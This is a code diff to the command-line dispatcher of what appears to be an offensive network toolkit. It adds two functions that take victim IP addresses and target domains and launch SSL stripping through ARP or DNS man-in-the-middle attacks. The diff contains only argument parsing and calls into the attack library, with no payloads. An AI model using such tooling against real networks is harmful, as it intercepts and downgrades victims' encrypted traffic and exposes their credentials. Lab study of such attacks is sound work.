@@ -4,6 +4,7 @@
 #include "helper/CLIParser.h"
 #include "helper/CLITypes.h"
 #include "log.h"
+#include "ssl_stripping/public.h"
 
 #include <iterator>
 #include <optional>
@@ -80,6 +81,42 @@ void CLIExecutor::invokeDnsSpoofing(std::vector<std::string> args) {
                                           .domainsToSpoof = domainsToSpoofSet});
     } else { // silent
         LOG_ERROR("Silent DNS not implemented yet");
+    }
+}
+
+void CLIExecutor::invokeSslStrippingArp(std::vector<std::string> args) {
+    if (!stringToBool(args[0])) { // all-out
+        LOG_ERROR("Not implemented yet!");
+    } else { // silent
+        std::vector<std::string> victimIps = split(args[2], ',');
+        const std::unordered_set<std::string> victimIpsSet(victimIps.begin(),
+                                                           victimIps.end());
+        std::vector<std::string> domainsToStrip = split(args[3], ',');
+        const std::unordered_set<std::string> domainsToStripSet(
+            domainsToStrip.begin(), domainsToStrip.end());
+        ATK::SSL::silentStrip(ATK::SSL::SilentStrippingOptions{
+            .ifaceIpOrName = args[1],
+            .victimIps = victimIpsSet,
+            .domainsToStrip = domainsToStripSet,
+            .mitmStrategy = ATK::SSL::MitmStrategy::ARP});
+    }
+}
+
+void CLIExecutor::invokeSslStrippingDns(std::vector<std::string> args) {
+    if (!stringToBool(args[0])) { // all-out
+        LOG_ERROR("Not implemented yet!");
+    } else { // silent
+        std::vector<std::string> victimIps = split(args[2], ',');
+        const std::unordered_set<std::string> victimIpsSet(victimIps.begin(),
+                                                           victimIps.end());
+        std::vector<std::string> domainsToStrip = split(args[3], ',');
+        const std::unordered_set<std::string> domainsToStripSet(
+            domainsToStrip.begin(), domainsToStrip.end());
+        ATK::SSL::silentStrip(ATK::SSL::SilentStrippingOptions{
+            .ifaceIpOrName = args[1],
+            .victimIps = victimIpsSet,
+            .domainsToStrip = domainsToStripSet,
+            .mitmStrategy = ATK::SSL::MitmStrategy::DNS});
     }
 }
 
